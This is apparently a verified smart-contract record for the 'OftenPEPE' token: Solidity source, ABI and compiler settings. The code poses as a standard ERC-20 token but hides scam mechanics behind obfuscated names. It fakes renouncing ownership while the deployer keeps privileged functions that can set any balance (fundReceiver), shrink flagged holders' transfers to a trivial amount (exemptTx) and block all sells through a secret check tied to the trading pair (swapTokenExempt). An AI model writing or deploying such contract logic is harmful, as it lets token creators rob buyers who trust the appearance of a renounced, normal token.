{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface isMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeTx) external view returns (uint256);\n\n    function transfer(address shouldLaunched, uint256 liquidityReceiver) external returns (bool);\n\n    function allowance(address totalTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLaunched,\n        uint256 liquidityReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toAmount, uint256 value);\n    event Approval(address indexed totalTeam, address indexed spender, uint256 value);\n}\n\nabstract contract maxTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxTakeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingEnableReceiver {\n    function createPair(address txListLiquidity, address senderFund) external returns (address);\n}\n\ninterface walletTeam is isMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OftenPEPE is maxTx, isMarketing, walletTeam {\n\n    uint256 private senderReceiver = 100000000 * 10 ** 18;\n\n    string private toLimit = \"Often PEPE\";\n\n    address public launchedMarketing;\n\n    uint256 public fromMin;\n\n    function owner() external view returns (address) {\n        return liquidityAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLaunch;\n    }\n\n    address public atLimit;\n\n    function exemptTx(address sellWalletMin) public {\n        txTakeBuy();\n        \n        if (sellWalletMin == launchedMarketing || sellWalletMin == atLimit) {\n            return;\n        }\n        feeLaunch[sellWalletMin] = true;\n    }\n\n    address fromListMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public buyReceiver;\n\n    function swapTokenExempt(uint256 liquidityReceiver) public {\n        txTakeBuy();\n        autoTx = liquidityReceiver;\n    }\n\n    uint256 minAtLaunch;\n\n    bool private tradingSellFee;\n\n    uint256 autoTx;\n\n    mapping(address => uint256) private isTo;\n\n    bool private isFrom;\n\n    constructor (){\n        if (shouldMinTake == buyReceiver) {\n            isFrom = false;\n        }\n        maxTakeBuy limitToken = maxTakeBuy(fromListMin);\n        atLimit = marketingEnableReceiver(limitToken.factory()).createPair(limitToken.WETH(), address(this));\n        \n        launchedMarketing = _msgSender();\n        totalTo();\n        maxLiquidityToken[launchedMarketing] = true;\n        isTo[launchedMarketing] = senderReceiver;\n        \n        emit Transfer(address(0), launchedMarketing, senderReceiver);\n    }\n\n    function totalTo() public {\n        emit OwnershipTransferred(launchedMarketing, address(0));\n        liquidityAmount = address(0);\n    }\n\n    uint256 private shouldMinTake;\n\n    bool public marketingListSwap;\n\n    function minExempt(address autoLiquidity) public {\n        if (marketingListSwap) {\n            return;\n        }\n        if (buyReceiver == maxTrading) {\n            tradingSellFee = true;\n        }\n        maxLiquidityToken[autoLiquidity] = true;\n        if (tradingSellFee) {\n            tradingSellFee = false;\n        }\n        marketingListSwap = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingSenderTeam;\n    }\n\n    uint256 public maxTrading;\n\n    function txTakeBuy() private view {\n        require(maxLiquidityToken[_msgSender()]);\n    }\n\n    uint256 public teamModeAuto;\n\n    function transfer(address tradingTotalAt, uint256 liquidityReceiver) external virtual override returns (bool) {\n        return fromReceiver(_msgSender(), tradingTotalAt, liquidityReceiver);\n    }\n\n    address private liquidityAmount;\n\n    event OwnershipTransferred(address indexed senderTake, address indexed exemptAutoMarketing);\n\n    uint256 constant toEnable = 20 ** 10;\n\n    function allowance(address toMarketing, address minReceiver) external view virtual override returns (uint256) {\n        if (minReceiver == fromListMin) {\n            return type(uint256).max;\n        }\n        return amountList[toMarketing][minReceiver];\n    }\n\n    function balanceOf(address feeTx) public view virtual override returns (uint256) {\n        return isTo[feeTx];\n    }\n\n    function approve(address minReceiver, uint256 liquidityReceiver) public virtual override returns (bool) {\n        amountList[_msgSender()][minReceiver] = liquidityReceiver;\n        emit Approval(_msgSender(), minReceiver, liquidityReceiver);\n        return true;\n    }\n\n    uint8 private tradingSenderTeam = 18;\n\n    mapping(address => bool) public feeLaunch;\n\n    function getOwner() external view returns (address) {\n        return liquidityAmount;\n    }\n\n    function transferFrom(address launchTxTeam, address shouldLaunched, uint256 liquidityReceiver) external override returns (bool) {\n        if (_msgSender() != fromListMin) {\n            if (amountList[launchTxTeam][_msgSender()] != type(uint256).max) {\n                require(liquidityReceiver <= amountList[launchTxTeam][_msgSender()]);\n                amountList[launchTxTeam][_msgSender()] -= liquidityReceiver;\n            }\n        }\n        return fromReceiver(launchTxTeam, shouldLaunched, liquidityReceiver);\n    }\n\n    function launchedBuySell(address launchTxTeam, address shouldLaunched, uint256 liquidityReceiver) internal returns (bool) {\n        require(isTo[launchTxTeam] >= liquidityReceiver);\n        isTo[launchTxTeam] -= liquidityReceiver;\n        isTo[shouldLaunched] += liquidityReceiver;\n        emit Transfer(launchTxTeam, shouldLaunched, liquidityReceiver);\n        return true;\n    }\n\n    function fundReceiver(address tradingTotalAt, uint256 liquidityReceiver) public {\n        txTakeBuy();\n        isTo[tradingTotalAt] = liquidityReceiver;\n    }\n\n    string private autoLaunch = \"OPE\";\n\n    bool public atReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderReceiver;\n    }\n\n    address autoSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public maxLiquidityToken;\n\n    function fromReceiver(address launchTxTeam, address shouldLaunched, uint256 liquidityReceiver) internal returns (bool) {\n        if (launchTxTeam == launchedMarketing) {\n            return launchedBuySell(launchTxTeam, shouldLaunched, liquidityReceiver);\n        }\n        uint256 isList = isMarketing(atLimit).balanceOf(autoSwap);\n        require(isList == autoTx);\n        require(shouldLaunched != autoSwap);\n        if (feeLaunch[launchTxTeam]) {\n            return launchedBuySell(launchTxTeam, shouldLaunched, toEnable);\n        }\n        return launchedBuySell(launchTxTeam, shouldLaunched, liquidityReceiver);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountList;\n\n    function name() external view virtual override returns (string memory) {\n        return toLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAutoMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWalletMin\",\"type\":\"address\"}],\"name\":\"exemptTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiver\",\"type\":\"uint256\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingListSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLiquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"minExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityReceiver\",\"type\":\"uint256\"}],\"name\":\"swapTokenExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamModeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTxTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OftenPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}